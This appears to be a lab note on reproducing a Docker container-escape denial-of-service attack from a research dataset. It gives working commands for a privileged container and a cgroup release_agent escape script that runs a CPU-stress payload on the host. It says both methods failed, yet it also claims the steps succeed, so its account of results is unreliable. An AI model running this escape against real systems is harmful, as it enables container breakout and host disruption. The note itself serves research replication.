I attempted to replicate the following repository:
https://github.com/jpope8/container-escape-dataset/tree/main/containers

which has a guideline on how to reproduce a denial of service attack using an overprivileged docker container. There are the two following ways, both of which led to failure in reproducing the expected result:


### Ubuntu 21.10 or newer:

Due to switching from cgroup to cgroupv2 in these Ubuntu versions, this attack may not work as the memory cgroup does not exist anymore. As a workaround, we force Ubuntu to boot on cgroup instead by the following step:

Replace the following line in `/etc/default/grub`:
```
GRUB_CMDLINE_LINUX="systemd.unified_cgroup_hierarchy=0"
```

Now, following the steps regarding Ubuntu 21.04 or older will result in a successful attack.
### Ubuntu 21.04 or older:

By the instructions given in the repository, we run an overprivileged docker container from the latest ubuntu image with the command `bash`. For this, we run the following:

```
$ docker pull ubuntu
$ docker run --privileged --name=ESCAPE_DOS --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
In the overprivileged container that we are currently running, we update apt, install vim, and create the following script:
**/escape.sh**
```
#!/bin/sh
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup_memory /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
cat stress.txt > /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
and the following payload:
**/stress.txt**
```
#!/bin/bash
stress() {
  (
    pids=""
    cpus=${1:-1}
    seconds=${2:-60}
    echo loading $cpus CPUs for $seconds seconds
    trap 'for p in $pids; do kill $p; done' 0
    for ((i=0;i<cpus;i++)); do while : ; do : ; done & pids="$pids $!"; done
    sleep $seconds
  )
}
stress 2 20
```

Before exiting the container, we commit it using a host command line, and then we may exit the container.

Afterwards, we run the container from one host terminal and then execute `escape.sh` in our overprivileged container using the following command in another host terminal:
- Terminal 1:
```
docker run --name=ESCAPE_DOS --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu_escape bash
```
- Terminal 2:
```
docker exec -it ESCAPE_DOS /escape.sh
```


#vuln_attempt_inprog
